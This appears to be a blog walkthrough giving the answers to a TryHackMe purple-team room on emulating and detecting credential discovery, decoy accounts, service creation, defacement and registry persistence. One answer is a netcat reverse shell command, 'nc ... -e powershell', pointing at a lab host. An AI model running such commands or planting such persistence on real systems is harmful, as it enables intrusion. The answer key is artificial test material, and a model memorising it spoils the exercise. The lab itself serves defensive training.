---
layout: post
title: "TryHackMe  - Atomic Bird Goes Purple #2"
date: 2025-06-21
tags: ["tryhackme"]
categories: [tryhackme]
hubs: "TryHackMe/SOC Level 2/Threat Emulation"
identifier: "20250621T000000"
source_id: "a9d35c93-90b8-4643-b5b3-ba680158d604"
source_urls: "(https://tryhackme.com/room/atomicbirdtwo)"
source_path: "SOC Level 2/Threat Emulation/20250621T000000--tryhackme-atomic-bird-goes-purple-2__tryhackme.md"
---


# TryHackMe | Atomic Bird Goes Purple #2

## Task 1 | Introduction

Start MachineAtomic Bird Goes Purple #2

This room is the follow-up of the[ Atomic Bird Goes Purple #1 room.](https://tryhackme.com/room/atomicbirdone) Therefore, it is suggested to finish the first room and fulfil the prerequisites of that room before starting to work/practice in this room.

Remember, these rooms use a customised version of atomic tests to help you implement tailored Purple Teaming exercises with atomic tests and familiarise yourself with sample attack chains. A high-level mapping of the custom tests is listed below. Each task also shares the basic techniques and storyline of the planned custom actions.

 TaskBase Tactics Reference Techniques**Implemented Actions** #2
- TA003: Persistence
- TA004: Privilege Escalation
- TA005: Defense Evasion
- TA006: Credential Access

- T1036.004
- T1552.001
- T1078.003

- Cleartext Data Search
- Account Creation

#3
- TA003: Persistence
- TA004: Privilege Escalation
- TA007: Discovery
- TA009: Collection
- TA0040: Impact

- T1012
- T1112
- T1491
- T1543.003

- Service Creation
- Defacement
- Filetype Modification
- Planting Reverse Shell in Registry

 Remember, the bottom line of the activities found in this room is to enhance the impact of the Purple Team, Threat Emulation and Detection Engineering exercises by going beyond the defaults and basics. Again,  you will work on real-life scenarios using the outcomes you gained during the threat emulation module. You will emulate and hunt adversarial tactics and experience purple teaming exercises.

Before proceeding to the next task, let’s start the **Virtual Machine**  by pressing the **Start Machine**  button at the top of this task. The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page.

### **Answer the questions below**

**Question:** Start the attached VM and proceed to the next task.

*Answer:* 

     No answer needed

---

## Task 2 | In-Between - Discover and Hide

Case: In-Between - Discover and Hide

 Reference TechniquesGiven atomic tests are inspired by the following techniques.

- T1552.001 Unsecured Credentials: Credentials In Files
- T1078.003 Valid Accounts: Local Accounts

StorylinePurple Team aims to simulate discovering credentials in cleartext files and creating local accounts with a masquerading/typosquatting mindset. As a team member, your task is to discover the cleartext credentials, create accounts with given custom atomics and evaluate the generated artefacts.
ObjectiveExperiencing the potential impacts and artefacts of storing cleartext data, unprotected credentials and decoy accounts.The planned tests for this case are listed below.

   Planned tests 
```Planned tests 
T0002-1 TASK-2.1 Search cleartext data
T0002-2 TASK-2.2 Create clone/decoy account
```

 
**NOTE:**  You can revert the system modification and file change activities by using the cleanup command of the executed technique!

### **Answer the questions below**

**Question:** Execute test T0002-1 and open the document created on the Desktop.Which PowerShell library file is detected?

*Answer:* 

     YamlDotNet.xml

**Question:** Now go to the atomics path and update the executed script to include all "bak" files.What is the code snippet that needs to be added to the code?

*Answer:* 

     ,*.bak

**Question:** Run the cleanup command for the test T0002-1 and re-execute the test.Open the output file, and investigate the detected files.What is the secret key?

*Answer:* 

     L1LAFLHQ5peGsjh7Pee8wHFY1SBQHe85A1HZhVrK47Yf6cqmH3n8

**Question:** Execute test T0002-2 and investigate logs.What is the new account name?

*Answer:* 

     Adminstrator

---

## Task 3 | Manipulate, Deface, Persistence

Case: Manipulate, Deface, Persistence

 Reference TechniquesGiven atomic tests are inspired by the following techniques.

- TT1491 Internal Defacement
- T1112 Modify Registry
- T1543.003 Create or Modify System Process: Windows Service
- T1012 Query Registry

StorylinePurple Team aims to simulate creating custom services, manipulating file extensions, modifying the registry keys, and creating custom registry keys. As a team member, your task is to discover the cleartext credentials, create accounts with given custom atomics and evaluate the generated artefacts.
ObjectiveExperiencing the potential impacts and artefacts of creating services, file and registry modifications. The planned tests for this case are listed below.

   Planned tests 
```Planned tests 
T0003-1 TASK-3.1 Internal service creation
T0003-2 TASK-3.2 Defacement with registry
T0003-3 TASK-3.3 File changes like a ransom
T0003-4 TASK-3.4 Planting reverse shell command in the registry
```

 
**NOTE:**  You can revert the system modification and file change activities by using the cleanup command of the executed technique!

### **Answer the questions below**

**Question:** Execute test T0003-1.What is the name of the created service?

*Answer:* 

     thm-registered-service

**Question:** Which image is used to set the registry value for the created service?

*Answer:* 

     C:\Windows\system32\services.exe

**Question:** Execute test T0003-2.What is the ransom note?

*Answer:* 

     THM{THM_Offline_Index_Emulation}

**Question:** Execute test T0003-3.What is the updated file extension?

*Answer:* 

     .thm-jhn

**Question:** Execute test T0003-4.What is the assigned value of the malicious registry value?

*Answer:* 

     nc 10.10.thm.jhn 4499 -e powershell

---

## Task 4 | Conclusion

Congratulations! You just finished the Atomic Bird Goes Purple rooms.

In this room, we covered the implementation of custom atomic tests and detection for Purple Team, Threat Emulation and Detection Engineering exercises. If you liked this content, we invite you to visit the following to keep learning and sharpening your skills!

- [Tempest](https://tryhackme.com/room/tempestincident)
- [C](https://tryhackme.com/room/caldera)[aldera](https://tryhackme.com/room/caldera)
- Advanced Blue Team Path ( Available soon! )

### **Answer the questions below**

**Question:** Read the task above.

*Answer:* 

     No answer needed

---
